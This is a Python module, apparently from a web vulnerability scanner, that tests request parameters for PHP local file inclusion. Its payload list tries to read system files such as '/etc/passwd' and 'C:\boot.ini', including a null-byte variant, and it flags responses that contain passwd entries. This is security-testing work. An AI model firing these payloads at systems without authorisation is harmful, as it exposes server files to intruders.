
from core.scanner.module import ParamsScanner, Risk

class LFI(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Local File Inclusion",
        "Description": 'The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions. ',
        "Risk": Risk.High,
        "Referances": [
            "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)

    def check(self):
        endpoint = self.GetEndPoint()
        params = endpoint.GetAllParams()

        for param , value in params.items():
            
            if value.startswith("http") or endpoint.GetParamTypeByName(param) in ('submit', 'file', 'url'):
                continue
            
            self.InsertParamToScan(param)

        return self.HaveParamsToScan()

    def GetPayloads(self) -> list:
        return [
            "data://text/plain;base64,TEZJQjAwTQ==",
            "/etc/passwd","file://etc/passwd","/etc/passwd\x00",
            "C:\\boot.ini"
        ]
              
    def is_vulnerable(self,res):
        expected_response = [
            "LFIB00M", "Volume Serial",
            "root:x:0:0","/root:/bin/bash","daemon","/usr/sbin/nologin" 
        ]

        for text in expected_response:
            if text.lower() in res.text.lower():
                return True

        return False
        